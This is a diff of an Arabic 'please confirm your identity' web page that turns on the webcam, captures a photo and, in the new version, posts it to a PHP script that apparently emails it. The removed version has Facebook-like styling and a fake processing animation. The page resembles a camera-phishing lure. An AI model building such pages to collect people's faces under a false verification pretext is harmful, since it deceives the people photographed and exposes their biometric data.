@@ -7,136 +7,78 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
             text-align: center;
-            margin: 0;
-            padding: 0;
-            direction: rtl;
-        }
-        .header {
-            background-color: #1877f2;
-            color: white;
-            padding: 20px;
-            font-size: 24px;
-            font-weight: bold;
+            background-color: #f8f9fa;
         }
         .container {
-            background-color: white;
-            width: 90%;
-            max-width: 400px;
-            margin: 30px auto;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            text-align: center;
+            margin-top: 20px;
         }
         video, canvas {
-            width: 100%;
-            max-width: 320px;
+            border: 2px solid #007bff;
             border-radius: 10px;
-            margin-bottom: 15px;
+            margin-top: 10px;
         }
-        .btn {
-            background-color: #1877f2;
+        button {
+            background-color: #007bff;
             color: white;
-            padding: 12px 20px;
+            padding: 10px;
             font-size: 18px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            width: 90%;
             margin-top: 10px;
         }
-        .btn:hover {
-            background-color: #1558b0;
-        }
-        .loading-container {
-            display: none;
-            margin-top: 20px;
-        }
-        .loading-circle {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            border: 8px solid #4caf50;
-            border-top-color: transparent;
-            animation: spin 1s linear infinite;
-            margin: auto;
-        }
-        @keyframes spin {
-            100% { transform: rotate(360deg); }
-        }
-        .success-message {
-            font-size: 18px;
-            font-weight: bold;
-            color: #4caf50;
-            margin-top: 15px;
-            display: none;
-        }
-        .success-icon {
-            font-size: 50px;
-            color: #4caf50;
-            margin-top: 15px;
-            display: none;
+        button:hover {
+            background-color: #0056b3;
         }
     </style>
 </head>
 <body>
 
-    <div class="header">الرجاء تأكيد الهوية</div>
+    <h1>الرجاء تأكيد الهوية</h1>
+    <p>يرجى التقاط صورة واضحة لمتابعة عملية التسجيل.</p>
 
     <div class="container">
-        <video id="camera" autoplay></video>
-        <canvas id="canvas" style="display:none;"></canvas>
-        <button class="btn" onclick="capturePhoto()">التقاط الصورة</button>
-
-        <!-- عنصر التحميل -->
-        <div class="loading-container" id="loading">
-            <div class="loading-circle"></div>
-            <p class="success-message">ستتم معالجة الصورة</p>
-            <div class="success-icon">✔</div>
-        </div>
+        <video id="video" width="320" height="240" autoplay></video>
+        <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+        <br>
+        <button onclick="captureImage()">التقاط الصورة</button>
     </div>
 
     <script>
-        const video = document.getElementById('camera');
-        const canvas = document.getElementById('canvas');
-        const loading = document.getElementById('loading');
-        const successMessage = document.querySelector('.success-message');
-        const successIcon = document.querySelector('.success-icon');
-
-        // تشغيل الكاميرا الأمامية
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-            .then(stream => {
-                video.srcObject = stream;
+        // تشغيل الكاميرا عند فتح الصفحة
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                document.getElementById("video").srcObject = stream;
             })
-            .catch(error => {
-                console.error('خطأ في تشغيل الكاميرا:', error);
-                alert('تعذر تشغيل الكاميرا، يرجى التحقق من الأذونات.');
+            .catch(function(error) {
+                alert("تعذر الوصول إلى الكاميرا: " + error);
             });
 
-        function capturePhoto() {
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+        function captureImage() {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const context = canvas.getContext("2d");
+
+            // التقاط الصورة من الفيديو
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // تحويل الصورة إلى بيانات Base64
+            const imageData = canvas.toDataURL("image/png");
 
-            // إيقاف الكاميرا بعد التقاط الصورة
-            video.srcObject.getTracks().forEach(track => track.stop());
+            // إرسال الصورة إلى الخادم
+            sendImageToServer(imageData);
+        }
 
-            // إخفاء الكاميرا وزر الالتقاط
-            video.style.display = 'none';
-            document.querySelector('.btn').style.display = 'none';
-
-            // عرض التحميل
-            loading.style.display = 'block';
-
-            // بعد 3 ثوانٍ، عرض علامة الصح والرسالة
-            setTimeout(() => {
-                document.querySelector('.loading-circle').style.display = 'none';
-                successMessage.style.display = 'block';
-                successIcon.style.display = 'block';
-            }, 3000);
+        function sendImageToServer(imageData) {
+            fetch("send_email.php", {
+                method: "POST",
+                body: JSON.stringify({ image: imageData }),
+                headers: { "Content-Type": "application/json" }
+            })
+            .then(response => response.text())
+            .then(data => alert(data))
+            .catch(error => alert("فشل الإرسال: " + error));
         }
     </script>
 
